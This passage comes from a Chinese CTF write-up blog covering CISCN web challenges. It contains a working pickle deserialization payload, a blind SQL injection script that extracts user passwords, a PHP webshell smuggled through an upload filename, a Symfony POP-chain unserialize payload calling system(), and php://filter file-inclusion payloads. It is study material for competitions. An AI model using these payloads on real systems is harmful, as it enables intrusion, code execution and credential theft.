class=\"line\">            p = pickle.loads(urllib.unquote(become))     </span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.render(<span class=\"string\">'form.html'</span>, res=p, member=<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.render(<span class=\"string\">'form.html'</span>, res=<span class=\"string\">'This is Black Technology!'</span>, member=<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n<p>编写exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__reduce__</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> eval,(<span class=\"string\">\"open('/flag.txt','r').read()\"</span>,)</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    a = test()</span><br><span class=\"line\">    payload = pickle.dumps(a)</span><br><span class=\"line\">    print(urllib.quote(payload))  <span class=\"comment\">#c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure>\n\n<p>在/b1g_m4mber界面点击一键成为大会员</p>\n<p>在BP中修改post中的become数据</p>\n<p><img src=\"/pic/84.png\" alt=\"\"></p>\n<h2 id=\"总决赛-Day2-Web1-Easyweb\"><a href=\"#总决赛-Day2-Web1-Easyweb\" class=\"headerlink\" title=\"总决赛 Day2 Web1 Easyweb\"></a>总决赛 Day2 Web1 Easyweb</h2><p>打开又是一个登入界面，访问robots.txt</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-agent: *</span><br><span class=\"line\">Disallow: *.php.bak</span><br></pre></td></tr></table></figure>\n\n<p>在登入界面登入后有一个get /image.php?id=1请求</p>\n<p>访问/image.php.bak得到源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;﻿?php</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">\"config.php\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$id=<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">\"id\"</span>])?$_GET[<span class=\"string\">\"id\"</span>]:<span class=\"string\">\"1\"</span>;</span><br><span class=\"line\">$path=<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">\"path\"</span>])?$_GET[<span class=\"string\">\"path\"</span>]:<span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$id=addslashes($id);</span><br><span class=\"line\">$path=addslashes($path);</span><br><span class=\"line\"></span><br><span class=\"line\">$id=str_replace(<span class=\"keyword\">array</span>(<span class=\"string\">\"\\\\0\"</span>,<span class=\"string\">\"%00\"</span>,<span class=\"string\">\"\\\\'\"</span>,<span class=\"string\">\"'\"</span>),<span class=\"string\">\"\"</span>,$id);</span><br><span class=\"line\">$path=str_replace(<span class=\"keyword\">array</span>(<span class=\"string\">\"\\\\0\"</span>,<span class=\"string\">\"%00\"</span>,<span class=\"string\">\"\\\\'\"</span>,<span class=\"string\">\"'\"</span>),<span class=\"string\">\"\"</span>,$path); </span><br><span class=\"line\"></span><br><span class=\"line\">$result=mysqli_query($con,<span class=\"string\">\"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'\"</span>);</span><br><span class=\"line\">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class=\"line\"></span><br><span class=\"line\">$path=<span class=\"string\">\"./\"</span> . $row[<span class=\"string\">\"path\"</span>];</span><br><span class=\"line\">header(<span class=\"string\">\"Content-Type: image/jpeg\"</span>);</span><br><span class=\"line\">readfile($path);</span><br></pre></td></tr></table></figure>\n\n<p>addslashes() 返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（<em>‘</em>）、双引号（<em>“</em>）、反斜线（<em>\\</em>）与 NUL（<strong><code>NULL</code></strong> 字符）。</p>\n<p>因为单引号被过滤，刚好又有两个变量，id后面的单引号被转义后，path后面输入的内容就会被当作语句执行，然后把path后面的单引号注释掉就不会报错了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;select * from images where id&#x3D;&#39;\\&#39; or path&#x3D;&#39;$path&#39;&quot;    -&gt;</span><br><span class=\"line\">&quot;select * from images where id&#x3D;&#39; or path&#x3D;&#39; $path &quot;</span><br></pre></td></tr></table></figure>\n\n<p>编写盲注脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 2/14/2020 8:39 PM</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str2hex</span><span class=\"params\">(strs)</span>:</span></span><br><span class=\"line\">    hexs=<span class=\"string\">'0x'</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(len(strs)):</span><br><span class=\"line\">        hexs+=hex(ord(strs[x]))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">    print(hexs)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> hexs</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://48e2e973-9423-4d4e-b6ff-0e79cf4c1a5f.node3.buuoj.cn/image.php?id=\\\\0&amp;path=or id=('</span>+payload+<span class=\"string\">')--+'</span></span><br><span class=\"line\">    <span class=\"comment\"># print(url)</span></span><br><span class=\"line\">    html = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea</span><span class=\"params\">(s_payload,len=<span class=\"number\">999</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    x=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x &lt;= len :</span><br><span class=\"line\">        error = <span class=\"number\">0</span></span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"if(ascii(substr((%s),%d,1))&gt;%d,1,0)\"</span> % (s_payload,x, mid)</span><br><span class=\"line\"></span><br><span class=\"line\">            res = get(payload)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res.status_code == <span class=\"number\">404</span> <span class=\"keyword\">or</span> res.status_code == <span class=\"number\">429</span>:</span><br><span class=\"line\">                x=x<span class=\"number\">-1</span></span><br><span class=\"line\">                error = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            html=res.text</span><br><span class=\"line\">            <span class=\"comment\"># print(html,'*-*-*-*-*-*', mid)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'F'</span>  <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">0</span> :</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> error == <span class=\"number\">0</span> :</span><br><span class=\"line\">            result += chr(mid)</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">        x=x+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_database</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload)</span><br><span class=\"line\">    print(database)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tables</span><span class=\"params\">(db)</span>:</span></span><br><span class=\"line\">    db=str2hex(db)</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(table_name))from(information_schema.tables)where(table_schema='</span>+db+<span class=\"string\">')'</span></span><br><span class=\"line\">    tables=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_columns</span><span class=\"params\">(table)</span>:</span></span><br><span class=\"line\">    table = str2hex(table)</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(column_name))from(information_schema.columns)where(table_name='</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    columns=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(columns,table)</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'select(group_concat('</span>+columns+<span class=\"string\">'))from('</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    password=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_database() #ciscnfinal</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_tables('ciscnfinal') #images,users</span></span><br><span class=\"line\"></span><br><span class=\"line\">get_data(<span class=\"string\">'password'</span>,<span class=\"string\">'users'</span>) <span class=\"comment\">#1f97eef3ea37a28db040</span></span><br></pre></td></tr></table></figure>\n\n<p>其实直接猜表为users和栏password就好了   </p>\n<p>拿到密码然后登入，登入之后是一个文件上传，随便上传一个文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">I logged the file name you uploaded to logs&#x2F;upload.054981d8766f246f4da3af656bbf6fe9.log.php.</span><br></pre></td></tr></table></figure>\n\n<p>修改文件名为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;&lt;?&#x3D; eval($_POST[&#39;cmd&#39;]) ?&gt;&quot;</span><br></pre></td></tr></table></figure>\n\n<p>短标签<? ?>需要php.ini开启short_open_tag = On，但<?= ?>不受该条控制。</p>\n<p>采用js写法的标记发现不起作用。</p>\n<p>菜刀连接，flag在根目录，打开即可</p>\n<p><img src=\"/pic/85.png\" alt=\"\"></p>\n<h2 id=\"总决赛-Day1-Web4-Laravel1\"><a href=\"#总决赛-Day1-Web4-Laravel1\" class=\"headerlink\" title=\"总决赛 Day1 Web4 Laravel1\"></a>总决赛 Day1 Web4 Laravel1</h2><p>打开题目，有一段代码，还给出了源码地址，下载整个源码，进行代码审计</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//backup in source.tar.gz</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Controllers</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">IndexController</span> <span class=\"keyword\">extends</span> <span class=\"title\">Controller</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span><span class=\"params\">(\\Illuminate\\Http\\Request $request)</span></span>&#123;</span><br><span class=\"line\">        $payload=$request-&gt;input(<span class=\"string\">\"payload\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>($payload))&#123;</span><br><span class=\"line\">            highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            @unserialize($payload);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>直接给出了反序列化函数，接下来就是寻找POP链</p>\n<p>其中包含命名空间 <a href=\"https://www.runoob.com/php/php-namespace.html\" target=\"_blank\" rel=\"noopener\">关于命名空间</a></p>\n<p>先搜索__destruct，发现很多里面都是空的</p>\n<p><img src=\"/pic/86.png\" alt=\"\"></p>\n<p>后面在<code>vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php</code>找到一个</p>\n<p><img src=\"/pic/87.png\" alt=\"\"></p>\n<p>查看<code>invalidateTags</code>方法的定义</p>\n<p><img src=\"/pic/88.png\" alt=\"\"></p>\n<p>其中有一个<code>saveDeferred</code>，全局搜索看看，找到了<code>vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php</code></p>\n<p><img src=\"/pic/89.png\" alt=\"\"></p>\n<p>接着看<code>dosave</code>，就在当前页面的下面</p>\n<p><img src=\"/pic/90.png\" alt=\"\"></p>\n<p>此处存在动态调用可以调用到<code>system()</code></p>\n<p><img src=\"/pic/91.png\" alt=\"\"></p>\n<p><code>$this-&gt;setInnerItem</code>可控，<code>$innerItem</code>是我们传入的<code>$item</code>类中的<code>$innerItem</code>属性</p>\n<p>这里可以看到有 <strong>$item[“\\0*\\0expiry”]</strong>、<strong>$item[“\\0*\\0poolHash”]</strong> 这种写法，数组键名带有 <strong>\\0*\\0</strong> 。这实际上是类中，修饰符为 <strong>protected</strong> 的属性，在类强转成数组之后的结果</p>\n<p><img src=\"/pic/92.png\" alt=\"\"></p>\n<p>构造payload</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Symfony</span>\\<span class=\"title\">Component</span>\\<span class=\"title\">Cache</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CacheItem</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $innerItem = <span class=\"string\">'cat /flag'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Symfony</span>\\<span class=\"title\">Component</span>\\<span class=\"title\">Cache</span>\\<span class=\"title\">Adapter</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ProxyAdapter</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $setInnerItem = <span class=\"string\">'system'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TagAwareAdapter</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> $deferred = [];</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">    \t<span class=\"keyword\">$this</span>-&gt;pool = <span class=\"keyword\">new</span> ProxyAdapter();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = <span class=\"keyword\">new</span> TagAwareAdapter();</span><br><span class=\"line\">$a -&gt; deferred = <span class=\"keyword\">array</span>(<span class=\"string\">'a'</span> =&gt; <span class=\"keyword\">new</span> \\Symfony\\Component\\Cache\\CacheItem);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?payload&#x3D;O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A8%3A%22deferred%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A4%3A%22pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A1%3A%7Bs%3A58%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3B%7D%7D</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pic/93.png\" alt=\"\"></p>\n<h2 id=\"华北赛区-Day1-Web5-CyberPunk\"><a href=\"#华北赛区-Day1-Web5-CyberPunk\" class=\"headerlink\" title=\"华北赛区 Day1 Web5 CyberPunk\"></a>华北赛区 Day1 Web5 CyberPunk</h2><p>是一个登入页面，查看网页源码，在最后发现了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!--?file&#x3D;?--&gt;</span><br></pre></td></tr></table></figure>\n\n<p>可能是文件下载或者是文件包含</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload&#x3D;&#x2F;index.php?file&#x3D;index.php   返回数据为空</span><br></pre></td></tr></table></figure>\n\n<p>尝试使用伪协议</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload&#x3D;&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>\n\n<p>读取成功</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;index.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">ini_set(&#39;open_basedir&#39;, &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; $file &#x3D; $_GET[&quot;file&quot;];</span><br><span class=\"line\">$file &#x3D; (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);</span><br><span class=\"line\">if (isset($file))&#123;</span><br><span class=\"line\">    if (preg_match(&quot;&#x2F;phar|zip|bzip2|zlib|data|input|%00&#x2F;i&quot;,$file)) &#123;</span><br><span class=\"line\">        echo(&#39;no way!&#39;);</span><br><span class=\"line\">        exit;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @include($file);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">&lt;title&gt;index&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class=\"line\">\t&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">        &lt;h2&gt;2077发售了,不来份实体典藏版吗?&lt;&#x2F;h2&gt;</span><br><span class=\"line\">        &lt;img class&#x3D;&quot;logo&quot; src&#x3D;&quot;.&#x2F;assets&#x2F;img&#x2F;logo-en.png&quot;&gt;&lt;!--LOGOLOGOLOGOLOGO--&gt;</span><br><span class=\"line\">        &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class=\"line\">                &lt;h3&gt;提交订单&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                &lt;form role&#x3D;&quot;form&quot; action&#x3D;&quot;.&#x2F;confirm.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;application&#x2F;x-www-urlencoded&quot;&gt;</span><br><span class=\"line\">                    &lt;p&gt;</span><br><span class=\"line\">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class=\"line\">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class=\"line\">                    